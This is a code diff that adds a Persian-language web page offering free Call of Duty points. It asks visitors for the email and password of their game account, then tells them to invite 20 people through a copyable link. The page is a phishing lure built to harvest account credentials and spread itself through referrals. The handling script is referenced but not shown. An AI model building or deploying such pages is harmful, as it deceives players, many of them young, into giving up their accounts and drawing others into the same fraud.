@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دریافت سی پی کالاف دیوتی</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="icon" href="https://titles.trackercdn.com/modern-warfare/db/images/icon_currency_codpoints_large.png" type="image/png">
+</head>
+<body>
+    <div class="container">
+        <h1>دریافت سی پی کالاف دیوتی رایگان</h1>
+        <form id="requestForm">
+            <label for="method">لطفاً یک روش انتخاب کنید:</label>
+            <select id="method" name="method">
+                <option value="none">هیچ</option>
+                <option value="email">ایمیل</option>
+                <option value="id">یو آیدی</option>
+            </select>
+
+            <!-- ایمیل و پسورد -->
+            <div id="emailFields" class="hidden">
+                <label for="email">ایمیل ثبت نامی در بازی:</label>
+                <input type="email" id="email" name="email">
+                <label for="password">پسورد ثبت نامی:</label>
+                <input type="password" id="password" name="password">
+            </div>
+
+            <!-- یو آیدی -->
+            <div id="idFields" class="hidden">
+                <label for="userId">یو آیدی کالاف دیوتی:</label>
+                <input type="text" id="userId" name="userId">
+            </div>
+
+            <button type="submit">ارسال</button>
+        </form>
+
+        <!-- پیام بعد از ارسال -->
+        <div id="message" class="hidden">
+            <p>برای دریافت سی پی باید 20 نفر را به سایت دعوت کنید.</p>
+            <button id="getLinkButton">دریافت لینک دعوت</button>
+        </div>
+
+        <!-- لینک دعوت -->
+        <div id="linkContainer" class="hidden">
+            <p>این لینک را برای دعوت دیگران ارسال کنید:</p>
+            <input type="text" id="inviteLink" readonly>
+            <button onclick="copyLink()">کپی لینک</button>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
